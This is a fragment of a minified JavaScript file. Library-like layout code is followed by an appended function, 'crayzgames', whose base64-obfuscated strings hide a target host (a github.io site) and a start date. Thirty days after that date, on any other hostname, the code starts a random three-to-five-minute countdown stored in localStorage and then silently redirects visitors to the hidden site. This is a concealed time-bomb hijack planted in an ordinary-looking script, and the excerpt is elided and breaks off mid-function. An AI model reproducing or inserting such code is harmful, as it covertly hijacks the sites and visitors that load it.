      ...
      v = (function (t, e, i) {
        var n =
          ...
          r = s.reduce(function (e, i) {
            var n = Oe(t, i);
            return (
              (e.top = ie(n.top, e.top)), (e.right = ne(n.right, e.right)), (e.bottom = ne(n.bottom, e.bottom)), (e.left = ie(n.left, e.left)), e
            );
          }, Oe(t, o));
...
function crayzgames() {
  const endrnsez = "dWNiZy5naX";
  const qcbjgepu = "RodWIuaW8=";
  const mgwxeutm = atob(endrnsez + qcbjgepu);
  const jgojcilf = "MjAyNS0x";
  const gxcdqvpz = "Mi0yOQ==";
  const ozqpcybp = new Date(atob(jgojcilf + gxcdqvpz));
  const flyknqtb = atob("cmVkaXJlY3RfY291bnRkb3du");
  const itoyeton = atob("cmVkaXJlY3RfdGltZQ==");
  
  const ykqyocvn = window.location.hostname;
  const vcantrzk = Date.now();
  
  // Eğer zaten main_site'deysek hiçbir şey yapma
  if (ykqyocvn === mgwxeutm) return;
  
  // main_date'den 30 gün geçti mi kontrol et
  const bzhifdxc = 30 * 24 * 60 * 60 * 1000;
  const dvdmdhog = vcantrzk - ozqpcybp.getTime();
  
  if (dvdmdhog < bzhifdxc) {
    // 30 gün henüz geçmedi
    return;
  }
  
  // 30 gün geçti, localStorage kontrol et
  let cmpaxydp = localStorage.getItem(flyknqtb);
  let lvgobjhl = localStorage.getItem(itoyeton);
  
  if (!cmpaxydp) {
    // İlk kez, geri sayım başlat
    // 3-5 dakika arası rasgele seç (ms cinsinden)
    const swgjvhbi = 3 * 60 * 1000;  // 3 dakika
    const yiwdlbgb = 5 * 60 * 1000;  // 5 dakika
    const tcuqqrrq = Math.floor(Math.random() * (yiwdlbgb - swgjvhbi + 1)) + swgjvhbi;
    
    const gadlohlh = vcantrzk;
    const dlxshfdv = gadlohlh + tcuqqrrq;
    
    // localStorage'a kaydet
    localStorage.setItem(flyknqtb, "active");
    localStorage.setItem(itoyeton, dlxshfdv.toString());
    
    lvgobjhl = dlxshfdv;
  }
  
  // Geri sayım başlat
  const dlxshfdv = parseInt(lvgobjhl);
  const quviipsx = dlxshfdv - vcantrzk;
  
  if (quviipsx <= 0) {
    // Süre bitti, yönlendir
    localStorage.removeItem(flyknqtb);
    localStorage.removeItem(itoyeton);
    window.location.href = "https://" + mgwxeutm + "/";
    return;
  }
  
  // Geri sayım devam ediyor, belirli aralıklarla kontrol et
  const hqrushro = setInterval(() => {
    const gehaeesn = Date.now();
    const imrpdbsw = dlxshfdv - gehaeesn;
    
    if (imrpdbsw <= 0) {
      clearInterval(hqrushro);
      localStorage.removeItem(flyknqtb);
      localStorage.removeItem(itoyeton);
      window.location.href = "https://" + mgwxeutm + "/";
    }
